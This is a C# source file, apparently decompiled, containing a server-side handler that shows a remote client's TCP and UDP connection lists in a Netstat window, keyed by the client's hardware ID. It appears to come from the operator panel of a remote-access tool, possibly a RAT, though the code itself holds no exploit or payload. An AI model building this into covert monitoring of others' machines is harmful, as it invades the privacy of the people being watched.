using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerNetstat
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormNetstat form3 = (FormNetstat)Application.OpenForms["Netstat:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "Netstat [" + (string)objects[2] + "]";
				form3.client = client;
				form3.materialLabel1.Enabled = true;
				form3.dataGridView2.Enabled = true;
				form3.materialLabel1.Text = "Succues Connect";
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormNetstat form2 = (FormNetstat)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		case "ListTcp":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormNetstat form4 = (FormNetstat)client.Tag;
			form4.Invoke((MethodInvoker)delegate
			{
				form4.dataGridView2.Rows.Clear();
				form4.materialLabel1.Text = "Succues list Tcp";
				int num2 = 2;
				while (num2 < objects.Length)
				{
					DataGridViewRow dataGridViewRow2 = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num2++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (int)objects[num2++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = "TCP"
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num2++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num2++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num2++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num2++]
							}
						}
					};
					form4.dataGridView2.Rows.Add(dataGridViewRow2);
				}
			});
			break;
		}
		case "ListUdp":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormNetstat form = (FormNetstat)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Succues list Udp";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (int)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = "UDP"
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = ""
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							}
						}
					};
					form.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		}
	}
}
